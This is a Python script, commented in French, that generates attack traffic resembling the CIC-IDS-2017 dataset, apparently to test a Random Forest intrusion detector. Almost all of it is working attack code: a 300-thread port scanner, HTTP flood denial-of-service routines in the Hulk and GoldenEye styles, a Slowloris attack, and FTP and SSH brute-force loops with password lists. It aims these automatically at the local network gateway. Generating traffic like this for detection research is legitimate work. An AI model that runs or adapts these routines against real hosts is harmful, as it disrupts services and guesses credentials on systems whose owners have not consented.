"""Simulation d'attaques réseau calées sur les patterns CIC-IDS-2017.
Chaque attaque reproduit les features (flags, durée, bytes, IAT) du dataset
pour maximiser la détection par le modèle Random Forest.

Usage:
  python streaming/scapy_attacker.py port_scan   # nmap-like parallel scan
  python streaming/scapy_attacker.py dos_hulk    # HTTP Hulk (URIs aléatoires)
  python streaming/scapy_attacker.py dos_goldeneye  # HTTP GoldenEye (keep-alive)
  python streaming/scapy_attacker.py slowloris   # connexions HTTP partielles
  python streaming/scapy_attacker.py ftp_brute   # FTP-Patator style
  python streaming/scapy_attacker.py ssh_brute   # SSH-Patator style
  python streaming/scapy_attacker.py all         # tout enchaîner
"""
import random
import socket
import string
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed


def _find_gateway() -> str:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
        return local_ip.rsplit(".", 1)[0] + ".1"
    except Exception:
        return "192.168.0.1"


TARGET = _find_gateway()
print(f"[attacker] Cible auto-détectée : {TARGET}")


# ── Port Scan (nmap-like) ─────────────────────────────────────────────────
# CIC-IDS-2017 : nmap -sT rapide → flows courts, SYN+RST, 1-3 paquets, <10ms

def port_scan(target=TARGET, ports=range(1, 5001), workers=300):
    """Scan parallèle → pattern nmap-like → Port_Scan détecté."""
    print(f"[attacker] PORT SCAN → {target}  ports 1-5000 ({workers} workers)")

    def _probe(port):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.02)          # 20ms : timeout très court comme nmap -T4
            r = s.connect_ex((target, port))
            if r == 0:
                s.send(b"\r\n")         # 1 octet pour générer du payload fwd
            s.close()
        except Exception:
            pass

    with ThreadPoolExecutor(max_workers=workers) as ex:
        list(ex.map(_probe, ports))
    print(f"[attacker] Port scan terminé ({len(ports)} ports)")


# ── DoS Hulk ─────────────────────────────────────────────────────────────
# CIC-IDS-2017 : GoldenEye/Hulk → URIs uniques, User-Agents variés,
#   keep-alive, beaucoup de PSH+ACK, taux élevé

_UA = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/605.1 Safari/605",
    "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0) AppleWebKit/605.1 Mobile Safari",
    "curl/8.4.0",
    "python-requests/2.31.0",
]


def dos_hulk(target=TARGET, port=80, n=150, reqs_per_conn=12):
    """HTTP Hulk — URIs & User-Agents aléatoires, plusieurs requêtes par connexion → DoS_Hulk.

    Chaque connexion envoie reqs_per_conn requêtes GET avec URIs uniques.
    Cela génère des flows avec un packet_count élevé, ce qui est la signature
    discriminante de DoS_Hulk dans le dataset CIC-IDS-2017.
    """
    print(f"[attacker] DOS HULK → {target}:{port}  ({n} connexions × {reqs_per_conn} req)")
    errors = [0]

    def _req():
        try:
            ua = random.choice(_UA)
            s  = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((target, port))
            for _ in range(reqs_per_conn):
                uid  = "".join(random.choices(string.ascii_lowercase + string.digits, k=12))
                path = f"/?q={uid}&id={random.randint(1,99999)}&sid={uid[:5]}&ts={random.randint(1,9999)}"
                req  = (
                    f"GET {path} HTTP/1.1\r\n"
                    f"Host: {target}\r\n"
                    f"User-Agent: {ua}\r\n"
                    f"Accept: text/html,application/xhtml+xml,*/*;q=0.8\r\n"
                    f"Accept-Language: en-US,en;q=0.5\r\n"
                    f"Accept-Encoding: gzip, deflate\r\n"
                    f"Connection: keep-alive\r\n"
                    f"Cache-Control: no-cache\r\n"
                    f"Pragma: no-cache\r\n\r\n"
                )
                s.sendall(req.encode())
                try:
                    s.recv(2048)
                except Exception:
                    break
                time.sleep(random.uniform(0.01, 0.05))  # légère variation IAT
            s.close()
        except Exception:
            errors[0] += 1

    threads = [threading.Thread(target=_req) for _ in range(n)]
    for t in threads:
        t.start()
    for t in threads:
        t.join(timeout=15)
    print(f"[attacker] Hulk terminé (erreurs: {errors[0]}/{n})")


# ── DoS GoldenEye ─────────────────────────────────────────────────────────
# Pattern : connexions rapides avec keep-alive + petites requêtes répétées

def dos_goldeneye(target=TARGET, port=80, n=200):
    """HTTP GoldenEye — keep-alive + requêtes rapides → DoS_GoldenEye."""
    print(f"[attacker] DOS GOLDENEYE → {target}:{port}  ({n} connexions)")
    errors = [0]

    def _req():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((target, port))
            for _ in range(5):          # plusieurs requêtes par connexion
                uid = random.randint(1, 99999)
                s.send(
                    f"GET /?{uid} HTTP/1.1\r\nHost: {target}\r\n"
                    f"Connection: keep-alive\r\n\r\n".encode()
                )
                try:
                    s.recv(512)
                except Exception:
                    break
            s.close()
        except Exception:
            errors[0] += 1

    threads = [threading.Thread(target=_req) for _ in range(n)]
    for t in threads:
        t.start()
    for t in threads:
        t.join(timeout=10)
    print(f"[attacker] GoldenEye terminé (erreurs: {errors[0]}/{n})")


# ── DoS Slowloris ─────────────────────────────────────────────────────────
# CIC-IDS-2017 : longue durée, très peu de bytes, headers partiels envoyés
#   toutes les 10s → flows avec bytes_rate très bas et durée > 60s

def slowloris(target=TARGET, port=80, n_conns=100, duration=90):
    """Slowloris — connexions HTTP partielles longues → DoS_Slowloris.

    Génère des flows avec :
    - longue durée (90s)
    - très peu de bytes / très bas bytes_rate
    - header incomplet (pas de \\r\\n\\r\\n final)
    - keepalive via headers X-* supplémentaires toutes les 8s
    Ces features combinent pour couvrir la signature DoS_Slowloris dans CIC-IDS-2017.
    """
    print(f"[attacker] SLOWLORIS → {target}:{port}  ({n_conns} conns, {duration}s)")
    socks = []

    for i in range(n_conns):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(8)
            s.connect((target, port))
            s.send(
                f"GET /?sl={i}&sid={random.randint(1,9999)} HTTP/1.1\r\n"
                f"Host: {target}\r\n"
                f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n"
                f"Accept: text/html,*/*;q=0.8\r\n"
                f"Accept-Language: en-US,en;q=0.5\r\n"
                f"X-Forwarded-For: {random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}\r\n".encode()
            )
            socks.append(s)
        except Exception:
            pass
        if i % 20 == 0:
            time.sleep(0.1)

    print(f"[attacker] Slowloris : {len(socks)} connexions ouvertes")
    end = time.time() + duration
    while time.time() < end:
        alive = []
        for s in socks:
            try:
                s.send(f"X-{random.choice('ABCDEFGH')}-Keep: {random.randint(1,99999)}\r\n".encode())
                alive.append(s)
            except Exception:
                pass
        socks = alive
        if not socks:
            break
        remaining = int(end - time.time())
        print(f"[attacker] Slowloris : {len(socks)} connexions actives ({remaining}s restantes)")
        time.sleep(8)

    for s in socks:
        try:
            s.close()
        except Exception:
            pass
    print("[attacker] Slowloris terminé")


# ── FTP-Patator ──────────────────────────────────────────────────────────
# CIC-IDS-2017 : hydra/patator → beaucoup de tentatives AUTH FTP rapides
#   flows ~10-20 paquets, port 21, petit payload

_PASSWORDS = [f"pass{i:04d}" for i in range(200)] + [
    "admin", "root", "123456", "password", "admin123", "test", "guest",
]

def ftp_brute(target=TARGET, port=21, attempts=100):
    """FTP-Patator — tentatives AUTH rapides → FTP-Patator."""
    print(f"[attacker] FTP BRUTE → {target}:{port}  ({attempts} tentatives)")
    ok = 0

    def _try(pwd):
        nonlocal ok
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((target, port))
            banner = s.recv(256)                   # 220 banner
            s.send(b"USER admin\r\n")
            s.recv(256)                             # 331 Password required
            s.send(f"PASS {pwd}\r\n".encode())
            resp = s.recv(256)
            if b"230" in resp:                      # 230 = Login successful
                ok += 1
            s.send(b"QUIT\r\n")
            s.close()
        except Exception:
            pass

    with ThreadPoolExecutor(max_workers=20) as ex:
        ex.map(_try, _PASSWORDS[:attempts])
    print(f"[attacker] FTP brute terminé ({ok}/{attempts} succès)")


# ── SSH-Patator ──────────────────────────────────────────────────────────
# CIC-IDS-2017 : hydra SSH → banner exchange + AUTH → flows ~20-50 paquets
#   port 22, payload moyen (banner SSH + handshake crypto)

_SSH_USERS = ["root", "admin", "ubuntu", "pi", "user", "test", "deploy"]
_SSH_PASSES = [f"pass{i}" for i in range(100)] + [
    "root", "admin", "123456", "raspberry", "toor", "password",
]

def ssh_brute(target=TARGET, port=22, attempts=80):
    """SSH-Patator — banner exchange + tentatives AUTH → SSH-Patator."""
    print(f"[attacker] SSH BRUTE → {target}:{port}  ({attempts} tentatives)")
    connected = 0

    def _try(_):
        nonlocal connected
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((target, port))
            banner = s.recv(256)                   # SSH-2.0-OpenSSH_x.x
            if b"SSH" in banner:
                # Envoyer notre banner client
                s.send(b"SSH-2.0-libssh_0.9.6\r\n")
                # Lire le key exchange init (génère du trafic crypto)
                s.recv(1024)
                connected += 1
            s.close()
        except Exception:
            pass

    with ThreadPoolExecutor(max_workers=20) as ex:
        list(ex.map(_try, range(attempts)))
    print(f"[attacker] SSH brute terminé ({connected}/{attempts} avec banner SSH)")


# ── Main ──────────────────────────────────────────────────────────────────

MENU = {
    "port_scan":     port_scan,
    "dos_hulk":      dos_hulk,
    "dos_goldeneye": dos_goldeneye,
    "slowloris":     slowloris,
    "ftp_brute":     ftp_brute,
    "ssh_brute":     ssh_brute,
}


def main():
    choice = sys.argv[1] if len(sys.argv) > 1 else "all"
    print(f"[attacker] Mode  : {choice}\n")

    if choice == "all":
        print("[attacker] Lancement séquentiel de toutes les attaques...\n")

        port_scan()
        time.sleep(3)

        dos_hulk()
        time.sleep(3)

        dos_goldeneye()
        time.sleep(3)

        ftp_brute()
        time.sleep(1)

        ssh_brute()
        time.sleep(2)

        # Slowloris en dernier (bloquant pendant 90s) — daemon pour ne pas bloquer Ctrl+C
        t = threading.Thread(target=slowloris, daemon=True)
        t.start()

        print("\n[attacker] Toutes les attaques lancées. Ctrl+C pour arrêter.")
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print("[attacker] Arrêté")

    elif choice in MENU:
        MENU[choice]()
    else:
        print(f"Commandes : {' | '.join(MENU)} | all")


if __name__ == "__main__":
    main()
